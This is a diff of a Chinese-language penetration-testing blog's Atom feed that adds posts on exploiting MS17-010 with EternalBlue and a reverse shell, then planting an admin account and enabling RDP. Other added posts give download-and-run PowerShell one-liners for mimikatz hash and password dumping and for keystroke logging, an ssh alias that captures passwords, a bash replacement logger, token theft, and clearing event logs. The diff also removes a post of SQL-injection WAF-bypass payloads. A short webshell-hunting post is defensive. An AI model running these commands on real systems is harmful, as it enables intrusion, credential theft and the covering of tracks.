@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-12-04T15:12:54.197Z</updated>
+  <updated>2018-12-05T14:41:59.300Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,155 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>内网杀器--MS17-010漏洞</title>
+    <link href="http://yoursite.com/2018/12/05/%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8-MS17-010%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2018/12/05/内网杀器-MS17-010漏洞/</id>
+    <published>2018-12-05T13:30:13.000Z</published>
+    <updated>2018-12-05T14:41:59.300Z</updated>
+    
+    <content type="html"><![CDATA[<p>受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。</p><h1 id="实战利用："><a href="#实战利用：" class="headerlink" title="实战利用："></a>实战利用：</h1><p>攻击机：kali</p><p>目标机：win764位</p><p>打开msf</p><p>搜索msf17-010模块</p><pre><code>search msf17-010use auxiliary/scanner/smb/smb_ms17_010</code></pre><p><code>show option</code>查看配置选项，需要配置的参数，RHOSTS,THREADS：</p><pre><code>set RHOSTS 192.168.209.0/24set threads 10run</code></pre><p>扫描探测192.168.209网段下存在漏洞的主机：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw88o0oqvj30k80b3430.jpg" alt=""></p><p>发现了一个开445端口有漏洞的主机，接下来进入漏洞利用模块并设置payload</p><pre><code>use exploit/windows/smb/ms17_010_eternalblue 设置TCP连接set payload windows/x64/meterpreter/reverse_tcp</code></pre><p>用<code>options</code>查看需要配置的选项rhost和lhost</p><p>配置完后进行攻击：</p><pre><code>exploit</code></pre><p>成功进入</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw8tykenxj30ji0etwlq.jpg" alt=""></p><p>通过shell对目标机进行控制</p><pre><code>net user abc abc /add </code></pre><p>将用户blue添加入管理组 </p><pre><code>net localgroup administrators abc /add </code></pre><p>开启远程桌面功能 </p><pre><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><p>Kali远程桌面连接Win7 </p><pre><code>rdesktop 192.168.209.160:3389</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Se
+      
+    
+    </summary>
+    
+      <category term="漏洞利用" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>powershell gethash</title>
+    <link href="http://yoursite.com/2018/12/05/powershell-gethash/"/>
+    <id>http://yoursite.com/2018/12/05/powershell-gethash/</id>
+    <published>2018-12-05T12:45:31.000Z</published>
+    <updated>2018-12-05T12:47:58.815Z</updated>
+    
+    <content type="html"><![CDATA[<p>使用powershell远程调用来抓取hash。</p><p>在线导hash:</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&apos;);Get-PassHashes</code></pre><p>在线导明文</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;使用powershell远程调用来抓取hash。&lt;/p&gt;
+&lt;p&gt;在线导hash:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&amp;apos;https://raw.github
+      
+    
+    </summary>
+    
+      <category term="骚操作" scheme="http://yoursite.com/categories/%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Linux查找webshell</title>
+    <link href="http://yoursite.com/2018/12/05/Linux%E6%9F%A5%E6%89%BEwebshell/"/>
+    <id>http://yoursite.com/2018/12/05/Linux查找webshell/</id>
+    <published>2018-12-05T12:38:16.000Z</published>
+    <updated>2018-12-05T12:44:09.033Z</updated>
+    
+    <content type="html"><![CDATA[<p>在网站目录差找如下关键字：</p><pre><code>grep -Rn &quot;shell_exec *(&quot; /var/wwwgrep -Rn &quot;base64_decode *(&quot; /var/wwwgrep -Rn &quot;phpinfo *(&quot; /var/wwwgrep -Rn &quot;system *(&quot; /var/wwwgrep -Rn &quot;php_uname *(&quot; /var/wwwgrep -Rn &quot;chmod *(&quot; /var/wwwgrep -Rn &quot;fopen *(&quot; /var/wwwgrep -Rn &quot;fclose *(&quot; /var/wwwgrep -Rn &quot;readfile *(&quot; /var/wwwgrep -Rn &quot;edoced_46esab *(&quot; /var/wwwgrep -Rn &quot;eval *(&quot; /var/wwwgrep -Rn &quot;pwd&quot; /var/wwwgrep -Rn &quot;pass&quot; /var/wwwgrep -Rn &quot;pw&quot; /var/wwwgrep -Rn 密码&quot; /var/www</code></pre><blockquote><p>grep -rn：忽略大小写</p></blockquote><p>find:</p><pre><code>find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;在网站目录差找如下关键字：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;grep -Rn &amp;quot;shell_exec *(&amp;quot; /var/www
+
+grep -Rn &amp;quot;base64_decode *(&amp;quot; /var/www
+
+grep -Rn &amp;quot;
+      
+    
+    </summary>
+    
+      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>命令行下的信息收集</title>
+    <link href="http://yoursite.com/2018/12/05/%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    <id>http://yoursite.com/2018/12/05/命令行下的信息收集/</id>
+    <published>2018-12-05T12:16:29.000Z</published>
+    <updated>2018-12-05T12:33:14.081Z</updated>
+    
+    <content type="html"><![CDATA[<p>使用wmic识别安装到系统中的补丁情况</p><pre><code>wmic qfe get description,installedOn</code></pre><p>识别正在运行的服务</p><pre><code>sc query type= service或net start</code></pre><p>识别开机启动的程序，包括路径</p><pre><code>wmic startup list full</code></pre><p>ping探测存活主机</p><pre><code>for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr &quot;TTL=&quot; &gt;&gt; ping.txt</code></pre><p>查看系统中网卡的IP地址和MAC地址</p><pre><code>wmic nicconfig get ipaddress,macaddress</code></pre><p>查看当前系统是否有屏保保护，延迟是多少</p><pre><code>wmic desktop get screensaversecure,screensavertimeout</code></pre><p>查看系统中开放的共享</p><pre><code>wmic share get name,path或net share</code></pre><p>查看系统中开启的日志</p><pre><code>wmic nteventlog get path,filename,writeable</code></pre><p>清除相关的日志（这里是全部清除）</p><pre><code>wevtutil cl &quot;windows powershell&quot;wevtutil cl &quot;security&quot;wevtutil cl &quot;system&quot;</code></pre><p>查看系统中安装的软件以及版本</p><pre><code>wmic product get name,version</code></pre><p>查看某个进程的详细信息 （路径，命令行参数等）</p><pre><code>wmic process where name=&quot;chrome.exe&quot; list full</code></pre><p>终止一个进程</p><pre><code>wmic process where name=&quot;xshell.exe&quot; call terminatentsd -c q -p 进程的PID</code></pre><p>显示系统中的曾经连接过的无线密码</p><pre><code>netsh wlan show profiles netsh wlan show profiles name=&quot;profiles的名字&quot; key=clear</code></pre><p>查看当前系统是否是VMWARE</p><pre><code>wmic bios list full | find /i &quot;vmware&quot;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;使用wmic识别安装到系统中的补丁情况&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wmic qfe get description,installedOn
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;识别正在运行的服务&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sc query type= service
+或
+      
+    
+    </summary>
+    
+      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>密码记录工具</title>
+    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7/"/>
+    <id>http://yoursite.com/2018/12/05/密码记录工具/</id>
+    <published>2018-12-05T08:15:02.000Z</published>
+    <updated>2018-12-05T11:40:10.277Z</updated>
+    
+    <content type="html"><![CDATA[<p>在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。</p><h1 id="Windows-Powershell"><a href="#Windows-Powershell" class="headerlink" title="Windows Powershell"></a>Windows Powershell</h1><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvyc3cbrnj30dm08vq4m.jpg" alt=""></p><h1 id="Get-Keystrokes-ps1"><a href="#Get-Keystrokes-ps1" class="headerlink" title="Get-Keystrokes.ps1"></a>Get-Keystrokes.ps1</h1><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1</a></p><p>远程下载执行：</p><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><h1 id="Invoke-CredentialsPhish-ps1"><a href="#Invoke-CredentialsPhish-ps1" class="headerlink" title="Invoke-CredentialsPhish.ps1"></a>Invoke-CredentialsPhish.ps1</h1><p>Invoke-CredentialsPhish是nishang中的一个钓鱼工具，它能在目标桌面上弹出一个认证窗口。<br>不管是点击关闭，确定，还是取消，这个窗口都会反复弹出，除非用户输入正确的密码或是直接kill掉powershell进程。</p><pre><code>powershell -ep bypassiex (new-object net.webclient).downloadstring(&apos;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvz7vsiiqj309p08mdgp.jpg" alt=""></p><h1 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h1><h1 id="Linux-alias"><a href="#Linux-alias" class="headerlink" title="Linux alias"></a>Linux alias</h1><p>在~/.bashrc下添加如下一行：</p><pre><code>alias ssh=&apos;strace -o /var/tmp/.syscache-`date +&apos;%Y-%m-%d+%H:%m:%S&apos;`.log -s 4096 ssh&apos;</code></pre><p>再使更改生效：</p><pre><code>source ~/.bashrcapt-get install strace        //若缺少此软件，需要安装</code></pre><p>当有用户使用ssh命令时，会生成一个Log文件：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw0qzzxsqj30ke0dk0v6.jpg" alt=""></p><p>但是内容有点多，需要筛选一下：</p><pre><code>cat .syscache-2018-11-20+14\:11\:54.log  | grep  &quot;read(4&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxw0r8uoz1j30k20bgq45.jpg" alt=""></p><h1 id="sh2log"><a href="#sh2log" class="headerlink" title="sh2log"></a>sh2log</h1><p>ubuntu下载sh2log：</p><pre><code>wget http://packetstorm.foofus.com/UNIX/loggers/sh2log-1.0.tgz</code></pre><p>解压压缩包：</p><pre><code>tar –xvf sh2log-1.0.tgz</code></pre><p>Cd进入sh2log-1.0文件夹 安装libx11-dev</p><pre><code>sudo apt-get install libxll-dev</code></pre><p>安装完成后，编译sh2log：</p><p>输入make linux</p><p>新建一个shell脚本，脚本内容如下：</p><pre><code>sudo mkdir /bin/shells/sudo cp -p /bin/{sh,bash} /bin/shells/sudo rm -f /bin/{sh,bash}sudo cp -p sh2log /bin/bashsudo cp -p sh2log /bin/sh ./sh2logd</code></pre><p>保存脚本，添加执行权限：</p><pre><code>chmod +x  ./1.sh</code></pre><p>运行脚本：</p><pre><code>./1.sh</code></pre><p>启动后，可以用<code>ps -ef|grep sh2logd</code>来检查是否成功启动，它会在安装目录下生成一个bin文件</p><p>查看的话可以用parser这个工具查看：<code>./parser xxxxx.bin</code></p><p>输入bash，打开一个新的she11，随意输入一些命令 之后使用文件夹中的parser工具，</p><pre><code>./parser sh2log-xxxxx.bin</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。&lt;
+      
+    
+    </summary>
+    
+      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>密码提取神器--mimikatz</title>
+    <link href="http://yoursite.com/2018/12/05/%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E7%A5%9E%E5%99%A8-mimikatz/"/>
+    <id>http://yoursite.com/2018/12/05/密码提取神器-mimikatz/</id>
+    <published>2018-12-05T06:57:03.000Z</published>
+    <updated>2018-12-05T08:11:50.337Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="mimikatz抓取用户密码"><a href="#mimikatz抓取用户密码" class="headerlink" title="mimikatz抓取用户密码"></a>mimikatz抓取用户密码</h2><p><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203</a></p><p>mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden tickets等数种黑客技术。</p><p>mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令：</p><pre><code>privilege::debug #提升权限sekurlsa::logonpasswords #抓取密码</code></pre><blockquote><p>输入aaa::aaa，可展示所有模块</p></blockquote><p>可采用log命令，保存为日志</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwgt2walj30wh0hhmy1.jpg" alt=""></p><blockquote><p>要以管理员身份进入mimikatz</p></blockquote><p>用cmd5去爆破NTML值</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwi10mj0j30kk099dfw.jpg" alt=""></p><p>要钱，算了….</p><p>修改注册表，启用摘要密码支持</p><p>需要创建UseLogonCredential，并赋值为1</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxvwtjmhb7j30hf0eb0tf.jpg" alt=""></p><p>重新登录后，再次运行就可以抓取到明文密码啦。</p><h2 id="mimikatz令牌窃取"><a href="#mimikatz令牌窃取" class="headerlink" title="mimikatz令牌窃取"></a>mimikatz令牌窃取</h2><p>Windows有两种类型的Token：</p><ul><li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</li><li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li></ul><blockquote><p>两种token只在系统重启后清除</p></blockquote><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><h3 id="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"><a href="#使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token" class="headerlink" title="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"></a>使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</h3><p>以管理员身份运行mimikatz——&gt;使用<code>privilege::debug</code>获取debug权限——&gt;使用<code>token::elevate</code>模仿system用户的令牌——&gt;使用<code>token::list</code>列出令牌——&gt;使用 <code>lsadump::sam</code>来获取sam数据库中的密码——&gt;使用<code>token::revert</code>恢复令牌</p><h2 id="Powershell版的Mimikatz"><a href="#Powershell版的Mimikatz" class="headerlink" title="Powershell版的Mimikatz"></a>Powershell版的Mimikatz</h2><p>一句话执行：</p><pre><code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre><p>无文件执行：</p><pre><code>powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;mimikatz抓取用户密码&quot;&gt;&lt;a href=&quot;#mimikatz抓取用户密码&quot; class=&quot;headerlink&quot; title=&quot;mimikatz抓取用户密码&quot;&gt;&lt;/a&gt;mimikatz抓取用户密码&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu
+      
+    
+    </summary>
+    
+      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>nc命令使用</title>
@@ -358,107 +507,6 @@ TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这
     </summary>
     
       <category term="文件包含" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>SQL的WAF绕过</title>
-    <link href="http://yoursite.com/2018/12/02/SQL%E7%9A%84WAF%E7%BB%95%E8%BF%87/"/>
-    <id>http://yoursite.com/2018/12/02/SQL的WAF绕过/</id>
-    <published>2018-12-02T07:16:47.000Z</published>
-    <updated>2018-12-02T09:07:33.918Z</updated>
-    
-    <content type="html"><![CDATA[<p>WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。</p><h2 id="WAF的功能"><a href="#WAF的功能" class="headerlink" title="WAF的功能"></a>WAF的功能</h2><ul><li>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</li><li>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</li><li>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</li><li>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</li></ul><h2 id="WAF常见特点"><a href="#WAF常见特点" class="headerlink" title="WAF常见特点"></a>WAF常见特点</h2><ul><li>异常检测协议：拒绝不符合HTTP标准的请求</li><li>增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</li><li>白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题</li><li>基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</li><li>状态管理：重点进行会话保护</li><li>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</li></ul><h2 id="WAF识别扫描器"><a href="#WAF识别扫描器" class="headerlink" title="WAF识别扫描器"></a>WAF识别扫描器</h2><ul><li>1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识</li><li>2)  单IP+ cookie某时间段内触发规则次数</li><li>3)  隐藏的链接标签等(<code>&lt;a&gt;</code>)</li><li>4） Cookie植入</li><li>5)  验证码验证，扫描器无法自动填充验证码</li><li>6)  单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏</li></ul><h2 id="WAF绕过思路"><a href="#WAF绕过思路" class="headerlink" title="WAF绕过思路"></a>WAF绕过思路</h2><p>根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用<strong>%55</strong>也就是<strong>U</strong>的<strong>16进制</strong>编码来代替U，union写成 <strong>%55nION</strong>，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。</p><blockquote><p>也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。</p></blockquote><p>####（1）URL编码：</p><p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为<strong>%20</strong>、单引号<strong>%27</strong>、左括号<strong>%28</strong>、右括号<strong>%29</strong>，/为<strong>%25</strong>。</p><p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：</p><pre><code>?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT</code></pre><p>####（2）十六进制编码：</p><pre><code>/index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></pre><blockquote><p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p></blockquote><p>####（3）Unicode编码：</p><p>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p><p>常用的几个符号的一些Unicode编码：</p><ul><li>单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</li><li>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</li><li>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</li><li>右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9</li></ul><pre><code>?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1</code></pre><blockquote><p>一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用</p></blockquote><blockquote><p>二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p></blockquote><blockquote><p>三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过</p></blockquote><h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。</p><pre><code>index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</code></pre><blockquote><p>建议不要对此抱有太大希望….</p></blockquote><h3 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h3><p>常见的注释符：</p><pre><code>//-- /**/# --+--  -;--a</code></pre><h4 id="（1）普通注释"><a href="#（1）普通注释" class="headerlink" title="（1）普通注释"></a>（1）普通注释</h4><pre><code>index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users#</code></pre><blockquote><p><code>/**/</code>在构造得查询语句中插入注释，规避对<strong>空格</strong>的依赖或关键字识别;  #、–+用于终结语句的查询</p></blockquote><h4 id="（2）内联注释"><a href="#（2）内联注释" class="headerlink" title="（2）内联注释"></a>（2）内联注释</h4><p>相比普通注释，内联注释用的更多，它有一个特性<code>/*! */</code>只有<strong>MySQL</strong>能识别(<code>/*! */</code>表示注释里面的语句会被执行)</p><pre><code>实例一：?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3实例二：?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</code></pre><blockquote><p>两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括<code>/</code>、<code>*</code>在内的这些字符能正常使用</p></blockquote><h3 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h3><p>有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p><p>####（1）函数或变量</p><ul><li>hex()、bin() ==&gt; ascii()</li><li>sleep() ==&gt;benchmark()</li><li>concat_ws()==&gt;group_concat()</li><li>mid()、substr() ==&gt; substring()</li><li>@@user ==&gt; user()</li><li>@@datadir ==&gt; datadir()</li></ul><p>比如substr()被过滤了可以用mid()和left()、right()等函数。</p><pre><code>substr((select &apos;password&apos;),1,1) = 0x70strcmp(left(&apos;password&apos;,1), 0x69) = 1strcmp(left(&apos;password&apos;,1), 0x70) = 0strcmp(left(&apos;password&apos;,1), 0x71) = -1</code></pre><p>####（2）符号</p><p><code>and</code>和<code>or</code>有可能不能使用，或者可以试下<code>&amp;&amp;</code>和<code>||</code>能不能用；还有<code>=</code>不能使用的情况，可以考虑尝试<code>&lt;</code>、<code>&gt;</code>，因为如果不小于又不大于，那边是等于了。<br>在看一下用得多的空格，可以使用如下符号表示其作用：<code>%20</code>、<code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c</code>、<code>%0d</code>、<code>/**/</code></p><p>####（3）生僻函数</p><p><strong>MySQL/PostgreSQL</strong>支持<strong>XML</strong>函数：</p><pre><code>Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))　　SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror));　//postgresql?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</code></pre><blockquote><p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。　</p></blockquote><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>乌云drops上“waf的绕过技巧”一文使用的几个例子：</p><ol><li>使用反引号<strong>`</strong>，例如<strong>select `version()`</strong>，可以用来绕过<strong>空格</strong>和<strong>正则</strong>，特殊情况下还可以将其做<strong>注释符</strong>用</li><li>神奇的<code>-+.</code>，<code>select+id-1+1.from users;</code>   <code>+</code>是用于字符串连接的，<code>-</code>和<code>.</code>在此也用于连接，可以逃过<strong>空格</strong>和<strong>关键字</strong>过滤</li><li><code>@</code>符号，<code>select@^1.from users; `</code>@<code>用于变量定义如</code>@var_name<code>，一个</code>@<code>表示用户定义，</code>@@`表示系统变量</li><li><code>select-count(id)test from users;</code>  //绕过空格限制</li></ol><p>部分可能发挥大作用的字符(前文中没怎么说到的):</p><pre><code>`~!@%()[].-+|%00</code></pre><p>关键字拆分：</p><pre><code>‘se’+’lec’+’t’%S%E%L%E%C%T 1?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’)</code></pre><p>!和()：</p><pre><code>&apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT)</code></pre><blockquote><p>使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p></blockquote><h3 id="HTTP参数控制"><a href="#HTTP参数控制" class="headerlink" title="HTTP参数控制"></a>HTTP参数控制</h3><p>这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p><h4 id="HPP-HTTP-Parameter-Polution-（重复参数污染）"><a href="#HPP-HTTP-Parameter-Polution-（重复参数污染）" class="headerlink" title="HPP(HTTP Parameter Polution)（重复参数污染）"></a>HPP(HTTP Parameter Polution)（重复参数污染）</h4><pre><code>/?id=1;select+1,2,3+from+users+where+id=1—/?id=1;select+1&amp;id=2,3+from+users+where+id=1—/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</code></pre><blockquote><p>HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。</p></blockquote><blockquote><p>具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过</p></blockquote><h4 